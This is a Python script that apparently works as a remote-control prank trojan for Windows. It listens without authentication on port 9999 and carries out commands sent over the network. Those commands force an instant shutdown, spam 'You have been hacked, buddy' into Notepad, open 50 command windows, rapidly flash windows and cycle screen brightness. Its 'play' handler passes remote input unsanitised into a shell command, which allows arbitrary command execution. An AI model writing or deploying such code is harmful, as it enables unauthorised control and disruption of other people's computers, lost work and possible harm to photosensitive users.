


import socket
import subprocess
import time
import ctypes
import win32gui
import win32con
import pyautogui
import screen_brightness_control as sbc

def flash_screen():
    try:
        for _ in range(100):  # Flash 10 times
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
            time.sleep(0.1)
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_SHOW)
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in flash_screen: {e}")

def crazy_brightness():
    try:
        for _ in range(200):  # Loop to increase and decrease brightness
            sbc.set_brightness(100)
            time.sleep(0.2)
            sbc.set_brightness(1)
            time.sleep(0.2)
    except Exception as e:
        print(f"Error in crazy_brightness: {e}")

def handle_client(client_socket):
    try:
        print(f"[+] Connection from {client_socket.getpeername()}")

        while True:
            data = client_socket.recv(1024).decode().strip()
            if not data:
                print("[-] No data received. Closing connection.")
                break

            print(f"[+] Received: {data}")

            if data == "stopall":
                print("[+] Stop command received. Restoring system...")
                subprocess.run("taskkill /IM vlc.exe /F", shell=True)  # Stop VLC
                break  # Exit loop

            elif data.startswith("play "):
                video_path = data.split(" ", 1)[1]
                print(f"[+] Playing video: {video_path}")
                subprocess.run(f'start /MAX vlc "{video_path}"', shell=True)

            elif data == "shutdown":
                print("[+] Shutdown command received. Shutting down system...")
                subprocess.run("shutdown /s /t 0", shell=True)  # Instant shutdown
                break

            elif data == "lol":
                print("[+] LOL mode activated! Opening Notepad and spamming text...")
                subprocess.Popen("notepad.exe")
                time.sleep(1)  # Give Notepad some time to open

                for _ in range(500):
                    pyautogui.typewrite("You have been hacked, buddy")
                    pyautogui.press("enter")
                
                print("[+] LOL prank executed successfully!")

            elif data == "clihack":
                print("[+] CLI Hack activated! Opening 50 separate CMD windows...")

                for _ in range(50):  # Open 50 completely separate CMD windows
                    subprocess.Popen(['cmd.exe', '/c', 'start', 'cmd.exe', '/K', 'cd / && color a && tree'], shell=False)
                    time.sleep(0.2)  # Small delay to stagger openings

                print("[+] CLI Hack executed successfully!")

            elif data == "flashscreen":
                print("[+] Flash Screen activated!")
                flash_screen()

            elif data == "crazybrightness":
                print("[+] Crazy Brightness activated!")
                crazy_brightness()

    except Exception as e:
        print(f"Error handling client: {e}")

    finally:
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[+] Listening on 0.0.0.0:9999")

    while True:
        client_socket, addr = server.accept()
        handle_client(client_socket)

if __name__ == "__main__":
    start_server()
